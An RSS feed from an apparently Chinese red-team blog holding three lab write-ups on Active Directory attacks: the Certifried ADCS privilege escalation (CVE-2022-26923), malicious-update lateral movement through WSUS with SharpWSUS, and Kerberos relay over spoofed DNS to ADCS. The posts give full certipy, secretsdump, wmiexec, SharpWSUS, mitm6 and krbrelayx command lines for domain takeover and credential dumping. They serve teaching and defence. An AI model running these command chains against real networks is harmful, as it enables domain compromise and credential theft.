<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on lzzzzzzz</title>
        <link>https://lzzbb.github.io/posts/</link>
        <description>Recent content in Posts on lzzzzzzz</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Fri, 13 May 2022 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://lzzbb.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>CVE-2022-26923（ADCS）</title>
            <link>https://lzzbb.github.io/posts/2022/05/cve-2022-26923adcs/</link>
            <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2022/05/cve-2022-26923adcs/</guid>
            <description>漏洞披露 前置知识： 1.adcs可为域用户和机器账户申请证书
2.PKINIT 为 Kerberos 的扩展协议，可通过 X.509 证书用来获取 Kerberos 票据。总而言之可以将申请的证书转化为对应的TGT。（域用户转为域用户的TGT，机器账户转为机器账户的TGT）
3.PKCA扩展协议认证的时候，返回的PAC中包含了NTLM票据。（可以从用户证书中提取ntlm hash）
证书服务安装： https://www.anquanke.com/post/id/245791
漏洞概述 该漏洞与去年年底的nopac通过修改sAMAccountName来达到欺骗KDC类似；这个漏洞的利用是通过修改机器账户的dNSHostName属性，从而生成域内任意机器账户的证书进行利用。
可结合以前的nopac分析文章看，原理类似：https://www.anquanke.com/post/id/264500
定位ADCS服务器 1.域内利用certutil
certutil -config - -ping
2.LDAP中查找
CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=redteam,DC=lab
用户申请证书 UPN（userPrincipalName）是基于Internet标准RFC 822的用户样式登录名，UPN是可选并在域林中的安全主体对象名中保持唯一。在创建用户时可以指定也可不单独指定，用户格式为：username@domain.name。
域名：redteam.lab SamAccountName：marry NetBIOS登录名：reedteam\marry UserPrincipalName：marry@redteam.lab 用户申请证书时，ADCS Server将申请证书用户的UPN属性值添加到颁发证书的备用名称中，使用证书时将 UPN 从证书映射到目标用户进行识别，因为UPN是可选并在域林中的安全主体对象名中保持唯一，所以通过修改成与任意DC相同的UPN属性不会成立。
机器账户申请证书 机器账户申请证书时，CA 将从 Active Directory 中请求者用户对象的dNSHostName属性获得的值添加到已颁发证书的主题备用名称中进行识别，dNSHostName属性在AD中不要求唯一，所以可以通过修改成与任意DC相同的dNSHostName来达到欺骗ADCS的效果，实现域内提权。
漏洞利用需要修改机器账户dNSHostName字段，但如https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/所说：
 修改 samAccountName、DnsHostname 或 msDS-AdditionalDnsHostName 属性时SPN 列表会自动更新。
 添加机器帐户默认会创建4个SPN,包括以下内容：
1. HOST/MachineAccountName 2. HOST/MachineAccountName.domain.name 3. RestrictedKrbHost/MachineAccountName 4. RestrictedKrbhost/MachineAccountName.domain.name 意味着将要利用的机器账户改成和DC相同的SPN，但是SPN是网络控制器服务实例的唯一标识符，Kerberos身份验证使用它来将服务实例与服务登录帐户相关联，这时会产生冲突；但如果servicePrincipalName属性中HOST/MachineAccountName.domain.name和RestrictedKrbhost/MachineAccountName.domain.name在设置以上属性之前已被删除，那么SPN列表将不会更新，除非再次给该字段赋值。
漏洞利用 实验环境 域名：redteam.lab 1.ADCS服务器：AdcsMachine@192.168.129.151 2.域内域控Server2016：DC1@192.168.129.130 2.</description>
            <content type="html"><![CDATA[<h2 id="漏洞披露">漏洞披露</h2>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/9.png" alt=""></p>
<h2 id="前置知识">前置知识：</h2>
<p>1.adcs可为域用户和机器账户申请证书</p>
<p>2.PKINIT 为 Kerberos 的扩展协议，可通过 X.509 证书用来获取 Kerberos 票据。总而言之可以将申请的证书转化为对应的TGT。（域用户转为域用户的TGT，机器账户转为机器账户的TGT）</p>
<p>3.<strong>PKCA扩展协议认证的时候，返回的PAC中包含了NTLM票据</strong>。（可以从用户证书中提取ntlm hash）</p>
<h3 id="证书服务安装">证书服务安装：</h3>
<p><a href="https://www.anquanke.com/post/id/245791">https://www.anquanke.com/post/id/245791</a></p>
<h2 id="漏洞概述">漏洞概述</h2>
<p>该漏洞与去年年底的nopac通过修改sAMAccountName来达到欺骗KDC类似；这个漏洞的利用是通过修改机器账户的dNSHostName属性，从而生成域内任意机器账户的证书进行利用。</p>
<p>可结合以前的nopac分析文章看，原理类似：https://www.anquanke.com/post/id/264500</p>
<h3 id="定位adcs服务器">定位ADCS服务器</h3>
<p>1.域内利用certutil</p>
<p><code>certutil -config - -ping</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/10.png" alt=""></p>
<p>2.LDAP中查找</p>
<p><code>CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=redteam,DC=lab</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/11.png" alt=""></p>
<h3 id="用户申请证书">用户申请证书</h3>
<p>UPN（userPrincipalName）是基于Internet标准RFC 822的用户样式登录名，UPN是可选并在域林中的安全主体对象名中保持唯一。在创建用户时可以指定也可不单独指定，用户格式为：<code>username@domain.name</code>。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">域名：redteam.lab
</span></span><span class="line"><span class="cl">SamAccountName：marry
</span></span><span class="line"><span class="cl">NetBIOS登录名：reedteam\marry
</span></span><span class="line"><span class="cl">UserPrincipalName：marry@redteam.lab
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/1.png" alt=""></p>
<p>用户申请证书时，ADCS Server将申请证书用户的UPN属性值添加到颁发证书的备用名称中，使用证书时将 UPN 从证书映射到目标用户进行识别，因为UPN是可选并在域林中的安全主体对象名中保持唯一，所以通过修改成与任意DC相同的UPN属性不会成立。</p>
<h3 id="机器账户申请证书">机器账户申请证书</h3>
<p>机器账户申请证书时，CA 将从 Active Directory 中请求者用户对象的dNSHostName属性获得的值添加到已颁发证书的主题备用名称中进行识别，dNSHostName属性在AD中不要求唯一，所以可以通过修改成与任意DC相同的dNSHostName来达到欺骗ADCS的效果，实现域内提权。</p>
<p>漏洞利用需要修改机器账户dNSHostName字段，但如<a href="https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/">https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/</a>所说：</p>
<blockquote>
<p>修改 samAccountName、DnsHostname 或 msDS-AdditionalDnsHostName 属性时SPN 列表会自动更新。</p>
</blockquote>
<p>添加机器帐户默认会创建4个SPN,包括以下内容：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. HOST/MachineAccountName
</span></span><span class="line"><span class="cl">2. HOST/MachineAccountName.domain.name
</span></span><span class="line"><span class="cl">3. RestrictedKrbHost/MachineAccountName
</span></span><span class="line"><span class="cl">4. RestrictedKrbhost/MachineAccountName.domain.name
</span></span></code></pre></div><p>意味着将要利用的机器账户改成和DC相同的SPN，但是SPN是网络控制器服务实例的唯一标识符，<code>Kerberos身份验证使用它来将服务实例与服务登录帐户相关联，这时会产生冲突</code>；但如果servicePrincipalName属性中HOST/MachineAccountName.domain.name和RestrictedKrbhost/MachineAccountName.domain.name在设置以上属性之前已被删除，那么SPN列表将不会更新，除非再次给该字段赋值。</p>
<h2 id="漏洞利用">漏洞利用</h2>
<h3 id="实验环境">实验环境</h3>
<pre tabindex="0"><code>域名：redteam.lab
1.ADCS服务器：AdcsMachine@192.168.129.151
2.域内域控Server2016：DC1@192.168.129.130
2.域内用户marrys，密码Qq123456..
</code></pre><p>定位ADCS服务器</p>
<p><code>certutil</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/8.png" alt=""></p>
<p>1.域用户添加机器账户Lzz$</p>
<p>可以用powermad，也可以用impacket中的addcomputer.py，但dNSHostName字段需要自己后面更改，certipy已经可以实现一条命令部署。</p>
<p><code>certipy account create redteam.lab/marrys:'Qq123456..'@192.168.129.130 -user Lzz -dns 'DC1.redteam.lab'</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/2.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/3.png" alt=""></p>
<p>2.申请Lzz$的机器证书</p>
<p><code>certipy req redteam.lab/Lzz\$:'ByEFrd1Qyn1imbvt'@192.168.129.151 -ca 'redteam-ADCSMACHINE-CA-1' -template 'Machine'</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/4.png" alt=""></p>
<p>可以看到映射dNSHostName从而申请了DC1的的机器证书</p>
<p>3.将证书转换为TGT（<strong>返回的PAC中同样包含了ntlm hash</strong>）</p>
<p><code>certipy auth -pfx dc1.pfx -username DC1\$ -domain redteam.lab -dc-ip 192.168.129.130</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/5.png" alt=""></p>
<p>3.DC机器账户具有dcsync权限，利用证书中提权出来的ntlm hash进行dcsync</p>
<p><code>python3 secretsdump.py 'redteam.lab/DC1$'@192.168.129.130 -hashes :641347068fbb231b1e14fac2280dd818 -just-dc-user administrator</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/6.png" alt=""></p>
<p>4.wmi通过administrator进行远程连接</p>
<p><code>python3 wmiexec.py 'redteam.lab/administrator'@192.168.129.130 -hashes :5e95607216d9a4b7654d831beb9ee95c</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/CVE-2022-26923/7.png" alt=""></p>
<h2 id="防御">防御</h2>
<p>1.限制MAQ=0</p>
<p>2.打补丁</p>
<h2 id="参考">参考</h2>
<p><a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4</a></p>
]]></content>
        </item>
        
        <item>
            <title>WSUS利用</title>
            <link>https://lzzbb.github.io/posts/2022/05/wsus%E5%88%A9%E7%94%A8/</link>
            <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2022/05/wsus%E5%88%A9%E7%94%A8/</guid>
            <description>WSUS简介 WSUS是微软在其网络结构中提供的关于系统补丁更新的一个解决方案，在一些规模较大的域可能会出现。
WSUS可以在域内机器不出网的时候，将客户端绑定到WSUS Server上，将一些补丁或者组件更新时直接放到WSUS Server，通过 HTTP （8530端口）和 HTTPS （8531端口）与 Microsoft 通信来加载补丁，然后推到指定的域机器上，方便运维进行管理。
最常见的情况是单域采用一台WSUS更新服务器进行管理，下图是域内单台(左)和多台WSUS右的架构图：
利用 通过SharpWSUS枚举WSUS信息、推送恶意补丁到目标机器进行横向渗透。
实验环境： 域名：redteam.lab 1.域内WSUS服务器server2019（机器名：WSUS-1） 2.域内域控Server2016（机器名：DC2） 2.域内机器win7（机器名：dm2007） 当前环境是拿到了域内win7的权限，然后通过WSUS Server进行横向渗透。
定位当前主机WSUS Server 1.通过注册表
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
2.通过SharpWSUS
SharpWSUS.exe locate
由上面的信息收集，可以得到WSUS Server机器名为WSUS-1，然后我们想方设法获得了WSUS-1的机器权限。
 通过WSUS-1枚举WSUS服务的详细信息：
其中包括当前管理的计算机列表、ip、版本信息、上一次更新的时间。
SharpWSUS.exe inspect
可以看到域控（DC2）也在这台WSUS Server 更新的目标内，可以向它推送恶意更新，例如：添加本地管理员用户。
要点 1.WSUS横向最不确定的因素是无法控制客户端何时向WSUS Server拉取补丁信息，这个属性通常在域内搭建WSUS的组策略中设置。利用成功与否决定于客户端安装了攻击者提供的恶意补丁。
2.WSUS的有效负载必须是Microsoft 签名的二进制文件，并且必须指向磁盘上的某个位置，使 WSUS Server指向该二进制文件。由于需要签名的二进制文件，可以用PsExec.exe 以 SYSTEM 身份执行、RunDLL32在网络共享上运行恶意 DLL等方法进行横向，下面以psexec举例。
横向 1.生成一个用psexec执行添加本地管理员组的恶意补丁，其中updateid是补丁的更新id。
SharpWSUS.exe create /payload:&amp;quot;C:\Users\public\psexec.exe&amp;quot; /args:&amp;quot;-accepteula -s -d cmd.exe /c &#39;net user lzz Qq123456.. /add &amp;amp;&amp;amp; net localgroup administrators lzz /add&#39;&amp;quot; /title:&amp;quot;demo01&amp;quot;</description>
            <content type="html"><![CDATA[<h2 id="wsus简介">WSUS简介</h2>
<p>WSUS是微软在其网络结构中提供的关于系统补丁更新的一个解决方案，在一些规模较大的域可能会出现。</p>
<p>WSUS可以在域内机器不出网的时候，将客户端绑定到WSUS Server上，将一些补丁或者组件更新时直接放到WSUS Server，通过 HTTP （8530端口）和 HTTPS （8531端口）与 Microsoft 通信来加载补丁，然后推到指定的域机器上，方便运维进行管理。</p>
<p>最常见的情况是单域采用一台WSUS更新服务器进行管理，下图是域内单台(左)和多台WSUS右的架构图：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/1.png" alt=""></p>
<h2 id="利用">利用</h2>
<p>通过SharpWSUS枚举WSUS信息、推送恶意补丁到目标机器进行横向渗透。</p>
<h3 id="实验环境">实验环境：</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">域名：redteam.lab
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">1.域内WSUS服务器server2019（机器名：WSUS-1）
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2.域内域控Server2016（机器名：DC2）
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2.域内机器win7（机器名：dm2007）
</span></span></code></pre></div><p>当前环境是拿到了域内win7的权限，然后通过WSUS Server进行横向渗透。</p>
<h3 id="定位当前主机wsus-server">定位当前主机WSUS Server</h3>
<p>1.通过注册表</p>
<p><code>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/3.png" alt=""></p>
<p>2.通过SharpWSUS</p>
<p><code>SharpWSUS.exe locate</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/4.png" alt=""></p>
<p>由上面的信息收集，可以得到WSUS Server机器名为WSUS-1，然后我们想方设法获得了WSUS-1的机器权限。</p>
<hr>
<p>通过WSUS-1枚举WSUS服务的详细信息：</p>
<p>其中包括当前管理的计算机列表、ip、版本信息、上一次更新的时间。</p>
<p><code>SharpWSUS.exe inspect</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/5.png" alt=""></p>
<p>可以看到域控（DC2）也在这台WSUS Server 更新的目标内，可以向它推送恶意更新，例如：添加本地管理员用户。</p>
<h3 id="要点">要点</h3>
<p>1.WSUS横向最不确定的因素是无法控制客户端何时向WSUS Server拉取补丁信息，这个属性通常在域内搭建WSUS的组策略中设置。利用成功与否决定于客户端安装了攻击者提供的恶意补丁。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/6.png" alt=""></p>
<p>2.WSUS的有效负载必须是Microsoft 签名的二进制文件，并且必须指向磁盘上的某个位置，使 WSUS Server指向该二进制文件。由于需要签名的二进制文件，可以用PsExec.exe 以 SYSTEM 身份执行、RunDLL32在网络共享上运行恶意 DLL等方法进行横向，下面以psexec举例。</p>
<h3 id="横向">横向</h3>
<p>1.生成一个用psexec执行添加本地管理员组的恶意补丁，其中updateid是补丁的更新id。</p>
<p><code>SharpWSUS.exe create /payload:&quot;C:\Users\public\psexec.exe&quot; /args:&quot;-accepteula -s -d cmd.exe /c 'net user lzz Qq123456.. /add &amp;&amp; net localgroup administrators lzz /add'&quot; /title:&quot;demo01&quot;</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/7.png" alt=""></p>
<p>随着补丁生成，补丁中的二进制文件（psexec.exe）也被保存在WSUS目录中并命名为wuagent.exe。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/8.png" alt=""></p>
<p>2.因为WSUS根据组进行管理，所以创建组Demos并将DC2加入Demos，设置恶意补丁作用于Demos。</p>
<p><code>SharpWSUS.exe approve /updateid:ac82689b-f451-4df5-bc1c-3cb653301252 /computername:dc2.redteam.lab /groupname:&quot;Demos&quot;</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/9.png" alt=""></p>
<p>在WSUS Server上也能看到补丁的详细信息。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/10.png" alt=""></p>
<p>3.检查组是否创建。</p>
<p><code>SharpWSUS.exe inspect</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/11.png" alt=""></p>
<p>同样能在WSUS Server上看到。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/12.png" alt=""></p>
<p>4.获取更新状态。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/13.png" alt=""></p>
<p>由于开始搭建组策略的时候设置了每天三点客户端更新，到了三点以后可以看到WSUS Server将demo01推送到了dc2上。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/14.png" alt=""></p>
<p>5.dc2安装更新后，恶意补丁成功创建了本地管理员账户。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/15.png" alt=""></p>
<p>6.攻击利用成功后，利用SharpWSUS删除恶意补丁。</p>
<p><code>SharpWSUS.exe delete /updateid:ac82689b-f451-4df5-bc1c-3cb653301252 /computername:dc2.redteam.lab /groupname:”Demos”</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/16.png" alt=""></p>
<p>可以看到Demos组和id为ac82689b-f451-4df5-bc1c-3cb653301252的补丁demo01被删除。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/WSUS/17.png" alt=""></p>
<h2 id="防范措施">防范措施</h2>
<p>1.最后攻击者成功后wuagent.exe不会被自动删除，可以利用此进行溯源。</p>
<p>2.攻击利用会创建新的WSUS组，可以随时监控组的创建和删除定位攻击。</p>
<h2 id="环境搭建">环境搭建：</h2>
<p><a href="http://mb.yidianzixun.com/article/0eP3ekLe">http://mb.yidianzixun.com/article/0eP3ekLe</a></p>
<p><a href="https://www.office26.com/computer/computer_27090.html">https://www.office26.com/computer/computer_27090.html</a></p>
<p><a href="https://www.cnblogs.com/Summer6/p/10921491.html">https://www.cnblogs.com/Summer6/p/10921491.html</a></p>
<h2 id="参考">参考：</h2>
<p><a href="https://docs.microsoft.com/de-de/security-updates/windowsupdateservices/18127657">https://docs.microsoft.com/de-de/security-updates/windowsupdateservices/18127657</a></p>
<p><a href="https://labs.nettitude.com/blog/introducing-sharpwsus/">https://labs.nettitude.com/blog/introducing-sharpwsus/</a></p>
]]></content>
        </item>
        
        <item>
            <title>通过DNS进行Kerberos Relay</title>
            <link>https://lzzbb.github.io/posts/2022/02/%E9%80%9A%E8%BF%87dns%E8%BF%9B%E8%A1%8Ckerberos-relay/</link>
            <pubDate>Fri, 25 Feb 2022 00:00:00 +0000</pubDate>
            
            <guid>https://lzzbb.github.io/posts/2022/02/%E9%80%9A%E8%BF%87dns%E8%BF%9B%E8%A1%8Ckerberos-relay/</guid>
            <description>当时成功后没截图，环境又出问题不想搭了，下面有些截图出处作者，旨在阐明自己的观点和理解
利用条件 一台Linux，同C段有一台域机器，能访问ADCS Web注册页面
漏洞存因 1.自 Windows Vista 以来的所有 Windows 都默认启用了IPV6，并且优先级比IPV4更高，每台机器都会定期请求DNS配置。
如果攻击者获取了一台linux权限，并在广播域内存在另外一台域机器，可以利用mitm6对其进行DNS欺骗，让域机器认定linux是自己的权威域名服务器。
2.AD中的 DNS 支持使用 Kerberos 在 DNS 上进行身份验证，用于此使具有动态地址的网络客户端的 DNS 记录与其当前 IP 地址保持同步：
1. 域内机器查询DNS中的SOA记录。 2. 域内DNS通常绑定在域控上，对查询进行回应。 3. 域机器请求对A记录进行动态更新。 4. 因为没有提供身份验证，DNS拒绝动态更新。 5. 客户端使用TKEY查询来协商经过身份验证的查询的密钥。 6. 服务器回答TKEY资源记录，完成身份验证。 7. 客户端再次发送动态更新，但现在伴随着一条TSIG记录，该记录是使用在步骤5和6中建立的密钥的签名。 8. 服务器更新其DNS记录。 第 5 步和第 6 步，包含 Kerberos 身份验证过程：
wireshark中提供直接将keytab 导入Kerberos，能将加密字段进行解密。
利用上述流程，mitm6 可以将自己宣传为 DNS 服务器，所以受害者将发送SOA到攻击者指定的假服务器，如果攻击者拒绝他们的动态更新，再使用 Kerberos 进行身份验证。
3.许多服务类实际上会隐式映射到 HOST 类（包括 DNS），因此当受害者请求 DNS 服务的票证时，实际上适用于具有 HOST SPN 的任何帐户。这是默认在域中的所有计算机帐户上设置的，因此可以针对在这些帐户下运行的任何服务。
4.在去年的关于ADCS利用的白皮书中，ESC8的利用涉及 NTLM 中继到证书服务的 HTTP 接口部分来颁发证书。该接口接受 NTLM 身份验证并没有强制验证签名， 因此可以将接收到的Kerberos 身份验证转发到 ADCS web页面来申请用户证书。</description>
            <content type="html"><![CDATA[<p>当时成功后没截图，环境又出问题不想搭了，下面有些截图出处作者，旨在阐明自己的观点和理解</p>
<h2 id="利用条件">利用条件</h2>
<p>一台Linux，同C段有一台域机器，能访问ADCS Web注册页面</p>
<h2 id="漏洞存因">漏洞存因</h2>
<p>1.自 Windows Vista 以来的所有 Windows 都默认启用了IPV6，并且优先级比IPV4更高，每台机器都会定期请求DNS配置。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/1.png" alt=""></p>
<p>如果攻击者获取了一台linux权限，并在广播域内存在另外一台域机器，可以利用mitm6对其进行DNS欺骗，让域机器认定linux是自己的权威域名服务器。</p>
<p>2.AD中的 DNS 支持使用 Kerberos 在 DNS 上进行身份验证，用于此使具有动态地址的网络客户端的 DNS 记录与其当前 IP 地址保持同步：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/2.png" alt=""></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 域内机器查询DNS中的SOA记录。
</span></span><span class="line"><span class="cl">2. 域内DNS通常绑定在域控上，对查询进行回应。
</span></span><span class="line"><span class="cl">3. 域机器请求对A记录进行动态更新。
</span></span><span class="line"><span class="cl">4. 因为没有提供身份验证，DNS拒绝动态更新。
</span></span><span class="line"><span class="cl">5. 客户端使用TKEY查询来协商经过身份验证的查询的密钥。
</span></span><span class="line"><span class="cl">6. 服务器回答TKEY资源记录，完成身份验证。
</span></span><span class="line"><span class="cl">7. 客户端再次发送动态更新，但现在伴随着一条TSIG记录，该记录是使用在步骤5和6中建立的密钥的签名。
</span></span><span class="line"><span class="cl">8. 服务器更新其DNS记录。
</span></span></code></pre></div><p>第 5 步和第 6 步，包含 Kerberos 身份验证过程：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/3.png" alt=""></p>
<p>wireshark中提供直接将<a href="https://wiki.wireshark.org/Kerberos" title="keytab 导入Kerberos">keytab 导入Kerberos</a>，能将加密字段进行解密。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/4.png" alt=""></p>
<p>利用上述流程，mitm6 可以将自己宣传为 DNS 服务器，所以受害者将发送SOA到攻击者指定的假服务器，如果攻击者拒绝他们的动态更新，再使用 Kerberos 进行身份验证。</p>
<p>3.许多服务类实际上会隐式映射到 HOST 类（包括 DNS），因此当受害者请求 DNS 服务的票证时，实际上适用于具有 HOST SPN 的任何帐户。这是默认在域中的所有计算机帐户上设置的，因此可以针对在这些帐户下运行的任何服务。</p>
<p>4.在去年的关于ADCS利用的白皮书中，ESC8的利用涉及 NTLM 中继到证书服务的 HTTP 接口部分来颁发证书。该接口接受 NTLM 身份验证并没有强制验证签名， 因此可以将接收到的Kerberos 身份验证转发到 ADCS web页面来申请用户证书。</p>
<p>5.在RFC 4556 中定义了 PKINIT 为 Kerberos 的扩展协议，可通过X.509 证书用来获取 Kerberos 票据 。后续在ADCS web页面申请的证书可以转换为用户的TGT。</p>
<h2 id="为什么不直接relay到ldap">为什么不直接relay到ldap？</h2>
<p>通常 DNS 服务器角色在域控上运行。因此DNS 服务的服务票证已经适用于在 DC 上运行的服务，因为它们使用相同的帐户，所以可以更改票证中的服务名称。这意味着攻击者可以将此票证中继到例如 LDAP。但是，如果仔看 TKEY 查询中的身份验证，会发现设置了请求完整性（签名）的标志。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/5.png" alt=""></p>
<p>这将自动触发 LDAP 签名，这会使整个攻击失败，因为如果没有在每条消息上提供有效的加密签名，之后我们就无法与 LDAP 交互。我们无法生成此签名，因为我们转发了身份验证并且实际上并不拥有解密服务票证和提取会话密钥所需的 Kerberos 密钥。</p>
<h2 id="漏洞利用">漏洞利用</h2>
<p>总流程如下：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/6.png" alt=""></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.受害机器在同个广播域定期请求DHCPv6配置。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2.攻击者利用mitm6对受害者主机欺骗，指出自己的DNS是权威域名服务器。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">3.受害者认定攻击者是权威域名服务器，向攻击者请求DNS动态更新。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">4.更新被攻击者拒绝，需要让受害者进行身份验证。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">5.受害者向KDC（域控）请求指定服务（DNS）的ST票据，将票据传给攻击者再次进行身份认证。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">6.攻击者利用krbrelayx将ST relay到ADCS中的web页面申请受害者机器证书。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">7.攻击者利用gettgtpkinit将上一步申请的证书转化为受害者机器的TGT，并通过gets4uticket进行S4Utoself模仿域管访问拿到受害者机器最高权限。
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/7.png" alt=""></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">域名：wd.local
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">域控：WIN-6ERMGJ5ECLO.wd.local （192.168.3.1）
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ADCS服务器: adcs.wd.local (192.168.3.103)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">受害者（域内主机）：win10.wd.local （192.168.3.108）
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">攻击者：192.168.3.100 
</span></span></code></pre></div><p>受害机器在同个广播域定期请求DHCPv6配置。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/8.png" alt=""></p>
<p>攻击者运行的mitm6 告诉受害者他是权威DNS服务器。</p>
<p><code>mitm6 --domain wd.local --host-allowlist win10.wd.local --relay adcs.wd.local -v</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/9.png" alt=""></p>
<p>当受害系统尝试执行 DNS 更新时，更新被攻击者拒绝，需要让受害者进行身份验证。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/10.png" alt=""></p>
<p>受害者向KDC（域控）请求指定服务（DNS）的ST票据，并再次请求更新。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/11.png" alt=""></p>
<p>将上一步生成的票据传给攻击者再次进行身份认证。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/12.png" alt=""></p>
<p>攻击者利用krbrelayx将ST relay到ADCS中的web页面申请受害者机器证书。</p>
<p><code>python3 krbrelayx.py --target http://adcs.wd.local/certsrv/ -ip 192.168.3.100 --victim win10.wd.local --adcs --template Machine</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/13.png" alt=""></p>
